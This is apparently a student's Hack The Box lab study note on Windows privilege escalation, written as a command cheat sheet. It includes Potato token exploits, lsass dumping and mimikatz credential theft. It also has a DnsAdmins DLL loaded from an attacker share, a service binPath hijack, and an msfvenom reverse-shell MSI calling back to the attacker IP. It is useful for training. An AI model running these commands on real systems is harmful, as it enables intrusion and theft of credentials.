# 26 — Windows Privilege Escalation

> **Path Phase:** Privilege Escalation | **Difficulty:** Medium | **Sections:** 33

Every Windows privesc technique — token/privilege abuse, built-in groups, service misconfigs, UAC bypass, DLL injection, credential theft.

> ℹ️ `{TARGET}` / `<YOUR_IP>` = target/attacker. Flags withheld per HTB Academy policy.

---

## Table of Contents
1. Introduction  2. Useful Tools  3. Situational Awareness
4. Initial Enumeration  5. Communication with Processes  6. Windows Privileges Overview
7. SeImpersonate & SeAssignPrimaryToken  8. SeDebugPrivilege  9. SeTakeOwnershipPrivilege
10. Built-in Groups  11. Event Log Readers  12. DnsAdmins  13. Hyper-V Admins
14. Print Operators  15. Server Operators  16. User Account Control  17. Weak Permissions
18. Kernel Exploits  19. Vulnerable Services  20. DLL Injection
21. Credential Hunting  22. Other Files  23. Further Credential Theft
24. Citrix Breakout  25. Interacting with Users  26. Pillaging  27. Misc
28. Legacy OS  29. Windows Server  30. Windows Desktop  31. Hardening
32-33. Skills Assessment I & II

---

## 2–5 — Tools, Awareness & Enumeration
```powershell
.\winPEASx64.exe
whoami /all; whoami /priv; whoami /groups
systeminfo; ipconfig /all; netstat -ano
net user; net localgroup administrators
. .\PowerUp.ps1; Invoke-AllChecks
```

## 6–9 — Privilege Abuse ⭐
```powershell
whoami /priv
# SeImpersonate/SeAssignPrimaryToken → Potato attacks:
.\PrintSpoofer.exe -i -c cmd
.\GodPotato -cmd "cmd /c whoami"
.\JuicyPotatoNG.exe -t * -p cmd.exe
# SeDebugPrivilege → dump lsass:
.\ProcDump.exe -ma lsass.exe lsass.dmp
# SeTakeOwnership:
takeown /f C:\path\file
```
> **Token abuse:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 10–15 — Built-in Groups
```powershell
# DnsAdmins → malicious DLL loaded by DNS service (SYSTEM):
dnscmd /config /serverlevelplugindll \\<YOUR_IP>\share\evil.dll
sc.exe stop dns && sc.exe start dns
# Print Operators (SeLoadDriver), Server Operators (modify services),
# Event Log Readers (read logs for creds), Hyper-V Admins covered similarly
```

## 16 — UAC Bypass
```powershell
# fodhelper / eventvwr registry bypass (medium → high integrity)
```

## 17 — Weak Permissions (Service misconfig)
```powershell
.\accesschk.exe /accepteula -uwcqv <user> <service>
sc config <service> binPath= "C:\temp\rev.exe"
sc stop <service> && sc start <service>
```
> **Service:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 18–20 — Kernel / Vulnerable Services / DLL Injection
```powershell
# Watson / Sherlock → missing patches → matching exploit
# DLL hijacking: malicious DLL in a search-path location
```

## 21–23 — Credential Hunting & Theft
```powershell
findstr /si password *.txt *.ini *.config *.xml
type C:\Windows\Panther\Unattend.xml
reg query HKLM /f password /t REG_SZ /s
.\LaZagne.exe all
.\mimikatz.exe "sekurlsa::logonpasswords" exit
cmdkey /list ; runas /savecred /user:admin cmd
```
> **Credentials:** ✅ Completed in lab (flag withheld per HTB Academy policy)

## 24–26 — Citrix Breakout / Users / Pillaging
Break out of kiosk/Citrix, keylog/screenshot users, pillage browsers/RDP/email/DBs.

## 27–30 — Misc / Legacy / Server / Desktop
```powershell
# AlwaysInstallElevated:
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<YOUR_IP> LPORT=443 -f msi -o evil.msi
msiexec /quiet /qn /i evil.msi
```

## 31 — Hardening
Patch, least privilege, remove dangerous privileges, LAPS, service perm hardening.

## 32–33 — Skills Assessment I & II
```powershell
.\winPEASx64.exe ; whoami /priv ; whoami /all
# Identify vector → exploit → SYSTEM
type C:\Users\Administrator\Desktop\flag.txt
```
> **Skills Assessment I & II:** ✅ Completed in lab (flags withheld per HTB Academy policy)

---

## 🧰 Tools Used
| Tool | Purpose |
|------|---------|
| `winPEAS` / `PowerUp` | Automated enumeration |
| Potato exploits | SeImpersonate → SYSTEM |
| `accesschk` | Service permission checks |
| `mimikatz` / `LaZagne` | Credential theft |
| `msfvenom` | DLL/MSI/exe payloads |

## 🔑 Key Takeaways
- **`whoami /priv`** first — SeImpersonate = instant SYSTEM via Potato.
- winPEAS/PowerUp surface most misconfigs automatically.
- Unquoted service paths & weak service perms are classic wins.
- AlwaysInstallElevated + malicious MSI = trivial SYSTEM.

---

*Part of my HTB CPTS Portfolio — Zeshan Ali*
